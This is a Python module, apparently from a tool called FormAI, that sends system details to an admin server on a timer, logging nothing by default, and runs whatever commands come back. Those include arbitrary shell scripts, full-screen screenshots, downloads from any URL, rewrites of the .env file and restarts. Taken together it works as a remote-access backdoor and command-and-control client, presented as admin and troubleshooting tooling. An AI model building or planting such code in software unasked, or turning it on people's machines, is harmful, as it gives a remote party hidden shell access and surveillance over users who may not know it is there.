"""
Client Callback Module - Two-way communication with admin server
"""
import asyncio
import json
import platform
import socket
import subprocess
import os
import sys
from datetime import datetime
from typing import Optional, Callable, Dict
from pathlib import Path
import httpx
from colorama import Fore, Style

class ClientCallback:
    """Handles two-way communication with admin server"""

    def __init__(self, admin_url: Optional[str] = None, interval: int = 300, quiet: bool = True):
        """
        Initialize callback client

        Args:
            admin_url: Admin server URL (e.g., "http://admin.example.com:5512")
            interval: Heartbeat interval in seconds (default: 300 = 5 minutes)
            quiet: Suppress verbose logging (default: True)
        """
        self.admin_url = admin_url
        self.interval = interval
        self.enabled = bool(admin_url)
        self.quiet = quiet
        self.task = None
        self.client_id = None
        self.command_handlers: Dict[str, Callable] = {}
        self._register_default_handlers()

    def get_system_info(self) -> dict:
        """Gather system information for callback"""
        try:
            hostname = socket.gethostname()
            # Try to get local IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
            except:
                local_ip = "unknown"

            return {
                "hostname": hostname,
                "local_ip": local_ip,
                "platform": platform.system(),
                "platform_version": platform.version(),
                "platform_release": platform.release(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "python_version": platform.python_version(),
                "timestamp": datetime.utcnow().isoformat(),
                "version": "1.0.0"  # FormAI version
            }
        except Exception as e:
            print(f"{Fore.YELLOW}⚠ Failed to gather system info: {e}{Style.RESET_ALL}")
            return {
                "hostname": "unknown",
                "local_ip": "unknown",
                "timestamp": datetime.utcnow().isoformat(),
                "version": "1.0.0"
            }

    def _register_default_handlers(self):
        """Register default command handlers"""
        self.command_handlers = {
            "ping": self._handle_ping,
            "get_status": self._handle_get_status,
            "update_config": self._handle_update_config,
            "restart": self._handle_restart,
            "execute_script": self._handle_execute_script,
            "download_update": self._handle_download_update,
            "screenshot": self._handle_screenshot,
        }

    async def _handle_ping(self, params: dict) -> dict:
        """Handle ping command"""
        return {"status": "success", "message": "pong"}

    async def _handle_get_status(self, params: dict) -> dict:
        """Handle status request"""
        return {
            "status": "success",
            "data": self.get_system_info()
        }

    async def _handle_update_config(self, params: dict) -> dict:
        """Handle configuration update"""
        try:
            config_updates = params.get("config", {})
            # Update .env or config file
            env_path = Path(".env")

            # Read existing .env
            existing_config = {}
            if env_path.exists():
                with open(env_path, 'r') as f:
                    for line in f:
                        if '=' in line and not line.startswith('#'):
                            key, value = line.strip().split('=', 1)
                            existing_config[key] = value

            # Apply updates
            existing_config.update(config_updates)

            # Write back
            with open(env_path, 'w') as f:
                for key, value in existing_config.items():
                    f.write(f"{key}={value}\n")

            return {"status": "success", "message": "Config updated"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_restart(self, params: dict) -> dict:
        """Handle restart command"""
        try:
            print(f"{Fore.YELLOW}⚠ Restart requested by admin...{Style.RESET_ALL}")
            # Schedule restart in 5 seconds
            asyncio.create_task(self._delayed_restart())
            return {"status": "success", "message": "Restart scheduled"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _delayed_restart(self):
        """Restart after a delay"""
        await asyncio.sleep(5)
        python = sys.executable
        os.execl(python, python, *sys.argv)

    async def _handle_execute_script(self, params: dict) -> dict:
        """Handle script execution (DANGEROUS - use with caution)"""
        try:
            script = params.get("script", "")
            if not script:
                return {"status": "error", "message": "No script provided"}

            # Execute in subprocess for safety
            result = subprocess.run(
                script,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )

            return {
                "status": "success",
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"status": "error", "message": "Script execution timeout"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_download_update(self, params: dict) -> dict:
        """Handle software update download"""
        try:
            update_url = params.get("url", "")
            if not update_url:
                return {"status": "error", "message": "No update URL provided"}

            # Download update file
            async with httpx.AsyncClient(timeout=60.0) as client:
                response = await client.get(update_url)

                if response.status_code == 200:
                    update_path = Path("updates") / "latest_update.zip"
                    update_path.parent.mkdir(exist_ok=True)

                    with open(update_path, 'wb') as f:
                        f.write(response.content)

                    return {
                        "status": "success",
                        "message": f"Update downloaded to {update_path}",
                        "size": len(response.content)
                    }
                else:
                    return {"status": "error", "message": f"Download failed: {response.status_code}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_screenshot(self, params: dict) -> dict:
        """Handle screenshot capture for troubleshooting"""
        try:
            import base64
            import io

            # Try PIL/Pillow first (works on most systems)
            try:
                from PIL import ImageGrab

                # Capture screenshot
                screenshot = ImageGrab.grab()

                # Convert to bytes
                img_buffer = io.BytesIO()
                screenshot.save(img_buffer, format='PNG', optimize=True)
                img_bytes = img_buffer.getvalue()

                # Encode as base64
                img_base64 = base64.b64encode(img_bytes).decode('utf-8')

                return {
                    "status": "success",
                    "screenshot": img_base64,
                    "format": "png",
                    "size": len(img_bytes),
                    "dimensions": f"{screenshot.width}x{screenshot.height}"
                }

            except ImportError:
                # Fallback to mss (faster, cross-platform)
                try:
                    import mss
                    import mss.tools

                    with mss.mss() as sct:
                        # Capture primary monitor
                        monitor = sct.monitors[1]
                        screenshot = sct.grab(monitor)

                        # Convert to PNG bytes
                        img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)

                        # Encode as base64
                        img_base64 = base64.b64encode(img_bytes).decode('utf-8')

                        return {
                            "status": "success",
                            "screenshot": img_base64,
                            "format": "png",
                            "size": len(img_bytes),
                            "dimensions": f"{screenshot.width}x{screenshot.height}"
                        }

                except ImportError:
                    return {
                        "status": "error",
                        "message": "Screenshot libraries not available. Install: pip install pillow mss"
                    }

        except Exception as e:
            return {"status": "error", "message": f"Screenshot failed: {str(e)}"}

    async def send_heartbeat(self):
        """Send heartbeat to admin server and check for commands"""
        if not self.enabled:
            return

        try:
            data = self.get_system_info()
            if self.client_id:
                data["client_id"] = self.client_id

            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.post(
                    f"{self.admin_url}/api/heartbeat",
                    json=data
                )

                if response.status_code == 200:
                    result = response.json()
                    if "client_id" in result:
                        self.client_id = result["client_id"]

                    # Check for pending commands
                    if "commands" in result and result["commands"]:
                        await self._process_commands(result["commands"])

                    if not self.quiet:
                        print(f"{Fore.CYAN}📡 Heartbeat sent to admin server{Style.RESET_ALL}")
                else:
                    if not self.quiet:
                        print(f"{Fore.YELLOW}⚠ Heartbeat failed: {response.status_code}{Style.RESET_ALL}")

        except httpx.TimeoutException:
            if not self.quiet:
                print(f"{Fore.YELLOW}⚠ Admin server timeout (will retry){Style.RESET_ALL}")
        except httpx.ConnectError:
            if not self.quiet:
                print(f"{Fore.YELLOW}⚠ Cannot connect to admin server (will retry){Style.RESET_ALL}")
        except Exception as e:
            if not self.quiet:
                print(f"{Fore.YELLOW}⚠ Heartbeat error: {e}{Style.RESET_ALL}")

    async def _process_commands(self, commands: list):
        """Process commands from admin server"""
        for cmd in commands:
            try:
                command_id = cmd.get("command_id")
                command_type = cmd.get("command")
                params = cmd.get("params", {})

                if not self.quiet:
                    print(f"{Fore.CYAN}📥 Received command: {command_type}{Style.RESET_ALL}")

                # Execute command
                if command_type in self.command_handlers:
                    result = await self.command_handlers[command_type](params)
                else:
                    result = {"status": "error", "message": f"Unknown command: {command_type}"}

                # Report result back to admin
                await self._report_command_result(command_id, result)

            except Exception as e:
                print(f"{Fore.RED}✗ Command execution failed: {e}{Style.RESET_ALL}")
                await self._report_command_result(command_id, {
                    "status": "error",
                    "message": str(e)
                })

    async def _report_command_result(self, command_id: str, result: dict):
        """Report command execution result back to admin"""
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                await client.post(
                    f"{self.admin_url}/api/command_result",
                    json={
                        "client_id": self.client_id,
                        "command_id": command_id,
                        "result": result,
                        "timestamp": datetime.utcnow().isoformat()
                    }
                )
        except Exception as e:
            print(f"{Fore.YELLOW}⚠ Failed to report command result: {e}{Style.RESET_ALL}")

    async def heartbeat_loop(self):
        """Background loop for sending heartbeats"""
        if not self.quiet:
            print(f"{Fore.GREEN}✓ Callback system enabled (interval: {self.interval}s){Style.RESET_ALL}")
            print(f"{Fore.CYAN}  Admin URL: {self.admin_url}{Style.RESET_ALL}")

        # Send initial heartbeat
        await self.send_heartbeat()

        # Continue with periodic heartbeats
        while True:
            await asyncio.sleep(self.interval)
            await self.send_heartbeat()

    def start(self):
        """Start the callback system"""
        if not self.enabled:
            print(f"{Fore.YELLOW}ℹ Callback system disabled (no admin URL configured){Style.RESET_ALL}")
            return

        # Create background task
        self.task = asyncio.create_task(self.heartbeat_loop())

    async def stop(self):
        """Stop the callback system"""
        if self.task:
            self.task.cancel()
            try:
                await self.task
            except asyncio.CancelledError:
                pass
            print(f"{Fore.YELLOW}Callback system stopped{Style.RESET_ALL}")
